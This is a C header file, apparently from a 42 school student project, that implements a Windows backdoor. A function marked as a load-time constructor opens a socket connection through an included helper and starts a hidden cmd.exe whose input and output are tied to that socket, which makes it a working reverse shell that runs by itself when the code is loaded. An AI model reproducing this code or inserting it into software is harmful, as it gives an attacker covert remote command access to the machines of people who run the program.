/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winsock_backdoor.h                                 :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/10 23:40:11 by joesanto          #+#    #+#             */
/*   Updated: 2026/01/11 17:21:49 by joesanto         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include "windows_reverse_shell.h"

__attribute__((constructor))
static
void    winsock_backdoor(void)
{
	SOCKET				client_fd;
	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	char 				cmd[] = "cmd.exe"; 

	if (winsock_client_connection(&client_fd) != 0)
		return;
	SetHandleInformation((HANDLE)client_fd, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = (HANDLE)client_fd;
	si.hStdOutput = (HANDLE)client_fd;
	si.hStdError = (HANDLE)client_fd;
	si.wShowWindow = SW_HIDE;
	if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		return ;
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

__attribute__((destructor))
static
void	winsock_cleanup(void)
{
	WSACleanup();
}
